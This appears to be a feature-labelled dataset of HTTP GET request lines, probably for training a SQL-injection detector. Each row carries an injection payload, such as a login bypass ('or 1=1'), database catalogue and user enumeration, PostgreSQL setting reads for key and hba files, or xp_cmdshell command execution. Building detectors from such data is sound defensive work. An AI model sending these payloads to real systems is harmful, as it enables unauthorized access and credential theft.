40,1,200,1139,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,3270,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,2064,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
32,1,200,5567,7,9,5,2,1,GET login/?id=' or 1=1– HTTP/1.1
32,1,200,4283,7,9,5,2,1,GET login/?id=' or 1=1– HTTP/1.1
32,1,200,5340,7,9,5,2,1,GET login/?id=' or 1=1– HTTP/1.1
58,1,200,7740,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,3761,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,4977,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,1010,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,5357,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,3297,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,5566,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,3234,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,2077,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,6681,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
58,1,200,7998,7,35,8,1,1,GET ?id=select current_setting('data_directory'); HTTP/1.1
68,1,200,3478,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,7517,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,4889,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,4290,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,4746,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,4174,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,2393,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,4661,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
53,1,200,7159,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,5018,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,5958,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,2373,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,4736,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,1454,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,6788,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,5718,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,1670,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,7299,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,7473,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,1249,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,1560,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
58,1,200,2183,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,6659,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,5358,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,4554,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,2815,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,3801,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,3117,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,1943,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,7201,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,4815,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,7599,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,6772,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,3811,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,6695,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,7496,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,4623,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,6761,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,3580,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
32,1,200,7892,7,6,9,1,1,GET ?id='or 1=1 or ''=' HTTP/1.1
32,1,200,7432,7,6,9,1,1,GET ?id='or 1=1 or ''=' HTTP/1.1
48,1,200,7491,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,2024,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,2478,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,1172,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,7999,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,5550,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,2451,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,7206,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,5500,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,7918,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
49,1,200,2842,7,23,7,1,1,GET ?id=' group by username having 1=1-- HTTP/1.1
49,1,200,4332,7,23,7,1,1,GET ?id=' group by username having 1=1-- HTTP/1.1
35,1,200,7512,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
35,1,200,3248,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
35,1,200,3812,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
35,1,200,2976,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
35,1,200,2380,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
35,1,200,2308,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
34,1,200,1718,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,6322,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
30,1,200,1752,7,4,8,1,1,GET ?id=) or ('1′='1– HTTP/1.1
30,1,200,6028,7,4,8,1,1,GET ?id=) or ('1′='1– HTTP/1.1
30,1,200,6140,7,4,8,1,1,GET ?id=) or ('1′='1– HTTP/1.1
30,1,200,1105,7,4,8,1,1,GET ?id=) or ('1′='1– HTTP/1.1
35,1,200,1900,7,9,10,1,1,GET ?id=admin') or ('1'='1 HTTP/1.1
35,1,200,4148,7,9,10,1,1,GET ?id=admin') or ('1'='1 HTTP/1.1
28,1,200,1887,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,2542,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,3666,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,3922,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
52,1,200,2623,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,6874,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,3705,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,6227,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,5503,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,6380,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,5804,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
63,1,200,6308,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,2136,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,6006,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,2991,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,1013,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,2209,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,3146,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,2948,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,2053,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,4877,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,2333,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,6806,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,7293,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,4408,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,5283,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,2186,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,2336,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,1059,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,7195,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,5454,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,5695,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,2232,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,4098,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,2701,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
38,1,200,1905,7,9,12,2,1,GET login/?id=') or ('1'='1'# HTTP/1.1
38,1,200,3357,7,9,12,2,1,GET login/?id=') or ('1'='1'# HTTP/1.1
38,1,200,3296,7,9,12,2,1,GET login/?id=') or ('1'='1'# HTTP/1.1
45,1,200,2002,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,7255,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,2511,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,5418,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,5275,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,4238,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,2143,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
45,1,200,1560,7,25,4,2,1,GET login/?id=select * from sysusers HTTP/1.1
32,1,200,3741,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4525,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4492,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6247,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
56,1,200,4649,7,26,10,2,1,GET ?id=' and substring(password/text()_1_1)='7 HTTP/1.1
56,1,200,1064,7,26,10,2,1,GET ?id=' and substring(password/text()_1_1)='7 HTTP/1.1
25,1,200,5782,7,4,4,1,0,GET ?id= or 1=1– HTTP/1.1
52,1,200,3045,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
52,1,200,3678,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
52,1,200,7317,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
52,1,200,3352,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
52,1,200,3429,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
52,1,200,4304,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
52,1,200,3591,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
52,1,200,3546,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
52,1,200,5897,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
33,1,200,5903,7,9,6,3,1,GET login/?id=' or 1=1/* HTTP/1.1
33,1,200,7387,7,9,6,3,1,GET login/?id=' or 1=1/* HTTP/1.1
33,1,200,1618,7,9,6,3,1,GET login/?id=' or 1=1/* HTTP/1.1
33,1,200,2793,7,9,6,3,1,GET login/?id=' or 1=1/* HTTP/1.1
80,1,200,4840,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,2244,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,3388,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,5442,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,3218,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,2522,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,1884,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,6964,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,7975,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,1056,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,3772,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
43,1,200,3795,7,14,11,3,1,GET login/?id=admin') or '1'='1'/* HTTP/1.1
43,1,200,5670,7,14,11,3,1,GET login/?id=admin') or '1'='1'/* HTTP/1.1
43,1,200,5332,7,14,11,3,1,GET login/?id=admin') or '1'='1'/* HTTP/1.1
43,1,200,6678,7,14,11,3,1,GET login/?id=admin') or '1'='1'/* HTTP/1.1
41,1,200,2077,7,9,6,2,1,GET login/?id=' or         0=0 # HTTP/1.1
58,1,200,3333,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,6002,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,3107,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,1058,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
